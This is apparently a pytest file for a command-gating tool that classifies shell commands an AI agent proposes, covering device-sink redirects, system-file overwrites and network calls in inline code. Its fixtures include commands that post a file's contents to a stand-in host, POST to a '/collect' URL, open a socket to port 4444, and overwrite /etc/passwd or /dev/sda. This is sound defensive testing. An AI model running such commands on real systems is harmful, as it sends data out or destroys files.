"""F1: redirects to /dev/null (and stdout/stderr/fd) are not overwrites.
F2: network libraries inside inline code (-c / -e / heredocs) reach a human."""
import pytest

from semgate import rules
from semgate.envelope import SCHEMA_VERSION, Envelope, ProposedAction, UserGrant
from semgate.gitstate import write_targets

GRANT = UserGrant(grant_id="g", principal="p", purpose="dev")


def env(command):
    return Envelope(schema=SCHEMA_VERSION, action=ProposedAction(tool="bash", arguments={"command": command}), grant=GRANT)


def classes(command):
    return {h.gate_class for h in rules.detect_gates(env(command))}


@pytest.mark.parametrize("command", [
    "find . -name '*.py' 2>/dev/null",
    "cmd > /dev/null 2>&1",
    "python -m pytest -q >/dev/null",
    "cat notes.txt > /dev/stdout",
    "echo oops 1>&2 2>/dev/stderr",
    "tool 2>/dev/fd/3",
])
def test_device_sinks_are_not_writes(command):
    assert not ({"destructive_irreversible", "system_write"} & classes(command))


@pytest.mark.parametrize("command", [
    "echo x > /dev/sda",
    "echo x > /etc/passwd",
    "echo x > /dev/nullx",
    "cat a > /tmp/out.txt",
])
def test_real_absolute_overwrites_still_gate(command):
    assert "destructive_irreversible" in classes(command)


def test_system_dir_writes_still_gate():
    assert "system_write" in classes("echo x > /dev/sda")
    assert "system_write" in classes("echo x > /etc/hosts")
    assert "system_write" in classes("f=/usr/local/bin/x; cat y > \"$f\"")


def test_relaxable_set_follows_the_pattern_objects():
    # `> /abs` stays relaxable after its pattern text changed (the old string
    # copy would have silently dropped it).
    assert rules.recoverable_destructive_only(env("echo hi > /tmp/x"))
    assert rules.recoverable_destructive_only(env("rm build/out.txt"))
    assert not rules.recoverable_destructive_only(env("git reset --hard"))
    assert not rules.recoverable_destructive_only(env("rm a.txt && shred b.txt"))
    relaxable = [src for src, flag in rules._DESTRUCTIVE_SPECS if flag]
    assert len(relaxable) == 11 and len(rules.RELAXABLE_DESTRUCTIVE) == 11   # +3 bulk in-place edit patterns


def test_write_targets_skip_device_sinks():
    assert write_targets("pytest -q > /dev/null 2>&1") == []
    assert write_targets("cmd >/dev/stdout") == [] and write_targets("cmd > /dev/fd/3") == []
    assert write_targets("echo x > out.txt") == ["out.txt"]


@pytest.mark.parametrize("command", [
    "python -c \"import urllib.request; print(urllib.request.urlopen('http://example.com').read())\"",
    "python3 -c 'import requests; requests.post(\"https://x.example\", data=open(\"a\").read())'",
    "python -c 'import http.client; c=http.client.HTTPSConnection(\"x\")'",
    "python -c 'import httpx; httpx.get(\"https://x\")'",
    "python -c 'import socket; s=socket.create_connection((\"x\", 80))'",
    "python -c 'import smtplib; smtplib.SMTP(\"mail.example\")'",
    "python -c 'import urllib3; urllib3.PoolManager()'",
    "node -e \"require('https').request('https://x.example')\"",
    "node -e \"fetch('https://x.example/collect', {method: 'POST'})\"",
    "node -e \"require('net').connect(4444, 'x.example')\"",
    "ruby -e 'require \"net/http\"; Net::HTTP.get(URI(\"https://x\"))'",
    # heredoc fed to an interpreter
    "python - <<'EOF'\nimport requests\nrequests.get('https://x.example')\nEOF",
    # nested: bash -c running python -c
    "bash -c \"python3 -c 'import socket; socket.socket().connect((\\\"x\\\", 1))'\"",
])
def test_network_in_inline_code_is_gated(command):
    hits = [h for h in rules.detect_gates(env(command)) if h.gate_class == "embedded_execution"]
    assert hits, command


@pytest.mark.parametrize("command", [
    "python -c \"import json; print(1)\"",
    "python -c 'import sys; print(sys.version)'",
    "node -e \"console.log(1 + 1)\"",
    "grep -rn requests.get src/",                                  # only extracted code is searched
    "cat > client.py <<'EOF'\nimport requests\nrequests.get('x')\nEOF",   # writing a file is not running it
    "python -c 'data = cursor.fetchall(); print(len(data))'",
])
def test_benign_inline_code_is_not_gated(command):
    assert "embedded_execution" not in classes(command)
